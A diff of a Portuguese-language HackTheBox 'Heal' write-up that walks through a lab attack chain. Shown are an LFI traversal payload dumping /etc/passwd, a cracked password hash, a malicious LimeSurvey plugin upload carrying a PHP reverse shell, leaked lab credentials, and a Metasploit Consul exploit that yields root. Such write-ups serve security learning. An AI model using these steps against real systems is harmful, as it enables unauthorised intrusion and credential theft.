@@ -2,10 +2,11 @@
 title: Heal HTB Write-up
 created: 2025-05-17 01:04
 tags: [hackthebox, ctf, walkthrough, ruby, limesurvey, consulUI]
-draft: true
+draft: false
 ---
 
-## Subtítulo aqui
+## Montar um currículo pode ser pior do que você imagina
+### Explorando vulnerabilidades no Ruby on Rails, LimeSurvey e Consul UI
 
 ---
 
@@ -143,15 +144,61 @@ Visitando a página da API, descobri que ela foi construída em **`Ruby on Rails
 
 ### LFI
 
-Após preencher o currículo e baixá-lo novamente, percebi que a API era ativada e que era possível um ataque de **`LFI`** na **URL** `http://api.heal.htb/download?filename=`.
+Após preencher o currículo e baixá-lo novamente, percebi que a **`API`** era ativada e que era possível um ataque de **`LFI`** na **URL** `http://api.heal.htb/download?filename=`.
 
 ![[heal-5.png]]
 
-Trocando o nome do arquivo pdf por `/download?filename=../../../../../etc/passwd`, consegui baixar um arquivo com o conteúdo do arquivo **`/etc/passwd`** do servidor.
+Trocando o nome do arquivo **`pdf`** por `/download?filename=../../../../../etc/passwd`, consegui baixar um arquivo com o conteúdo do arquivo **`/etc/passwd`** do servidor.
 
+```bash {39,45}
+┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
+└─$ file 09437f95a222c78fc3fe.pdf
+09437f95a222c78fc3fe.pdf: ASCII text 
 
+┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
+└─$ cat 09437f95a222c78fc3fe.pdf
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
+postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+ron:x:1001:1001:,,,:/home/ron:/bin/bash
+```
 
-Agora eu tinha dois possíveis usuários: `ralph` e `ron`. Lendo a documentação do Ruby, descobri que o local do arquivo `storage/development.sqlite3`. Então baixei o arquivo usando curl.
+Agora eu tinha dois possíveis usuários: `ralph` e `ron`. Lendo a documentação do **`Ruby`**, descobri que o local do arquivo `storage/development.sqlite3`. Então baixei o arquivo usando a ferramenta **`Curl`**.
 
 ```bash
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -164,7 +211,7 @@ Agora eu tinha dois possíveis usuários: `ralph` e `ron`. Lendo a documentaçã
 09437f95a222c78fc3fe.pdf  cheat-sheets.md  development.sqlite3  images  log-Heal.md  misc-Heal.md  nmap
 ```
 
-Usando o utilitário sqlite3 na minha máquina, pude ler a hash do usuário ralph.
+Usando o utilitário **`Sqlite3`** na minha máquina, pude ler a hash do usuário **`ralph`**.
 
 ```bash {16}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -209,28 +256,55 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-Eu já tinha um usuário e senha válido - `ralph : 147258369`. Mas essas credenciais não serviam no ssh e na página do currículo também não tinha muito o que fazer. Foi aí que entrando no subdomínio do survey, enontrei a página inicial que me informa que se trata de um LimeSurvey.
+Eu já tinha um usuário e senha válido - `ralph : 147258369`. Mas essas credenciais não serviam no [[SSH]] e na página de currículo também não tinha muito o que fazer. Foi aí que entrando no subdomínio do survey, encontrei a página inicial que me informa que se trata de um LimeSurvey.
 
 ### Limesurvey
 
-> [!question] What is LimeSurvey?
-> LimeSurvey is the simple, quick and anonymous online survey tool that's bursting with juicy insights. Calling students, professionals and enterprises: design a survey and get the best insights, it’s free and as easy as squeezing a lime
+> [!question] O que é o LimeSurvey?
+> O LimeSurvey é uma ferramenta de pesquisa online simples, rápida e anônima, repleta de insights interessantes. Segundo o próprio site oficial, a ferramenta é grátis e tão fácil quanto espremer um limão.
 
-Procurando por um exploit, encontrei um artigo que mostrava o caminho da página de login do LimeSurvey.
+Procurando por um exploit, encontrei este [artigo](https://ine.com/blog/cve-2021-44967-limesurvey-rce) que mostrava como acessar a página de login do LimeSurvey e como explorar a vulnerabilidade `CVE-2021-44967 LimeSurvey Authenticated RCE`.
 
 ![[heal-6.png]]
 
-usando as credenciais conseguidas, acesso o dashboard do administrador.
+Usando as credenciais `ralph : 147258369`, consegui acesso ao dashboard do administrador.
 
 ![[heal-7.png]]
 
 ### Shell as www-data
 
-Eu encontrei um exploit que estava desatualizado. Por isso o código python dava erro. Então eu atualizei o código do arquivo `config.xml` e instalei o arquivo zip manualmente.
+Eu encontrei o **[exploit](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE)** mencionado no artigo, porém estava um pouco desatualizado. Além disso, o código python dava erro. Então eu atualizei o código do arquivo `config.xml` e instalei o arquivo zip manualmente.
+
+```bash title=config.xml {11,21}
+<?xml version="1.0" encoding="UTF-8"?>
+<config>
+    <metadata>
+        <name>Y1LD1R1M</name>
+        <type>plugin</type>
+        <creationDate>2020-03-20</creationDate>
+        <lastUpdate>2020-03-31</lastUpdate>
+        <author>Y1LD1R1M</author>
+        <authorUrl>https://github.com/Y1LD1R1M-1337</authorUrl>
+        <supportUrl>https://github.com/Y1LD1R1M-1337</supportUrl>
+        <version>6.6.4</version>
+        <license>GNU General Public License version 2 or later</license>
+        <description>
+		<![CDATA[Author : Y1LD1R1M]]></description>
+    </metadata>
+
+    <compatibility>
+        <version>3.0</version>
+        <version>4.0</version>
+        <version>5.0</version>
+        <version>6.0</version>
+    </compatibility>
+    <updaters disabled="disabled"></updaters>
+</config> 
+```
 
 ![[heal-8.png]]
 
-Primeiro, eu crio um arquivo chamado shell.zip com os arquivos `config.xml` e `php-rev.php`. Então eu faço a instalação como um novo plugin no dashboard so site. Uma vez instalado, eu ativo o "plugin" e por fim, vou até o caminho da minha shell reversa.
+Primeiro, eu crio um arquivo chamado shell.zip com os arquivos `config.xml` e `php-rev.php`. Então eu faço a instalação como um novo plugin no dashboard do site. Uma vez instalado, eu ativo o "plugin" e por fim, vou até o caminho da minha shell reversa - `http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php`.
 
 Com o netcat escutando, recebo rapidamente a conexão do servidor.
 
@@ -264,13 +338,54 @@ return array(
                         'tablePrefix' => 'lime_', 
 ```
 
-Usando as credenciais `ron@heal.htb : AdmiDi0_pA$$w0rd`, conseguir acesso via ssh.
+Usando as credenciais `ron@heal.htb : AdmiDi0_pA$$w0rd`, conseguir acesso via ssh. Aproveitei para pegar a flag do usuário também.
+
+```bash {37,38}
+┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
+└─$ ssh ron@heal.htb
+ron@heal.htb\'s password:
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri May 16 10:41:34 PM UTC 2025
+
+  System load:           0.0
+  Usage of /:            67.0% of 7.71GB
+  Memory usage:          24%
+  Swap usage:            0%
+  Processes:             253
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.46
+  IPv6 address for eth0: dead:beef::250:56ff:fe94:bf46
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+29 updates can be applied immediately.
+18 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+ron@heal:~$ ls
+user.txt
+ron@heal:~$ cat user.txt
+c75125e78d031aced68b97c10001f473 
+```
 
 ---
 
 ## Escalação de Privilégios
 
-Listando os processos, encontrei um programa rodando pelo root em localhost.
+Listando os processos, encontrei o programa `/usr/local/bin/consul` rodando como root em localhost.
 
 ```bash {9}
 on@heal:/$ ps aux | grep "root"
@@ -291,7 +406,7 @@ root        3391  0.0  0.0      0     0 ?        I    23:03   0:00 [kworker/u256
 ron         3396  0.0  0.0   6612  2308 pts/1    S+   23:03   0:00 grep --color=auto root 
 ```
 
-Listando as conexões de rede, descobri que o programa está rodando na porta padrão 8500.
+Fazendo uma pesquisa rápida sobre o programa `Consul` descobri que a porta padrão é a **8500**. Listando as conexões de rede, a porta **8500** estava aberta e na escuta.
 
 ```bash {20}
 ron@heal:/$ ss -tulnp
@@ -322,13 +437,13 @@ tcp             LISTEN           0                128                           
 
 ### Consul UI
 
-Para ver o conteúdo da porta 8500, fiz um portforward no ssh, com o comando `ssh -L 8888:127.0.0.1:8500 ron@heal.htb`. Isso permitiu que eu acessasse a página no endereço `127.0.0.1:8888` e visse o conteúdo da porta 8500 do servidor.
+Para ver o conteúdo da porta 8500, fiz um `portforward` no ssh, com o comando `ssh -L 8888:127.0.0.1:8500 ron@heal.htb`. Isso permitiu que eu acessasse a página no endereço `127.0.0.1:8888` e visse o conteúdo da porta 8500 do servidor.
 
 Ao acessar, encontro o dashboard do `Consul UI`.
 
 ![[heal-10.png]]
 
-usando `searchsploit`, encontrei um exploit para o consul UI no `metasploit framework`.
+Usando a ferramenta `searchsploit`, encontrei um exploit para o consul UI no `metasploit framework`.
 
 ```bash
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Medium/Heal]
@@ -350,14 +465,14 @@ Shellcodes: No Results
 
 Usando o `metasploit framework`, encontrei o exploit `exploit/multi/misc/consul_service_exec`, também conhecido como `Hashicorp Consul Remote Command Execution via Services API`. 
 
-Tudo que é necessário é configurar:
+Tudo que precisei foi configurar:
 
-- RHOST=127.0.0.1
-- RHOST=8888
-- LHOST=tun0
-- LPORT=9001
+- **`RHOST`**=127.0.0.1
+- **`RPORT`**=8888
+- **`LHOST`**=tun0
+- **`LPORT`**=9001
 
-Daí dei o comando `run` e abri um sorriso de satisfação. Também aproveitei e peguei a flag do root. 
+Daí rodei o exploit com o comando `run` e abri um sorriso de satisfação. Também aproveitei e peguei a flag do root. 
 
 ```bash {43-45}
 msf6 exploit(multi/misc/consul_service_exec) > set rhost 127.0.0.1
@@ -414,6 +529,16 @@ root@heal:~#
 
 ![[HealFinal.png]]
 
-Palavras finais sobre o que aprendeu e CTA.
+Nessa máquina aprendi um pouco mais sobre **`Ruby on Rails`**, **`LimeSurvey`** e **`Hashcorp Consul UI`**. Também achei bem legal conectar uma vulnerabilidade com a outra aumentando assim a criticidade do ataque, fazendo com que um construtor de currículos se tornasse um pesadelo para o administrador de sistema.
+
+```mermaid
+flowchart TD
+    A[API] -->|LFI| B[banco de dados]
+    B -->|hash quebrada| C[LimeSurvey dashboard] 
+    C -->|RCE| D[Shell como www-data] 
+    D -->|config.php| E[shell como ron]
+    E -->|portforward| F[Consul UI]
+    F -->|metasploit| G[Shell como root]
+```
 
 
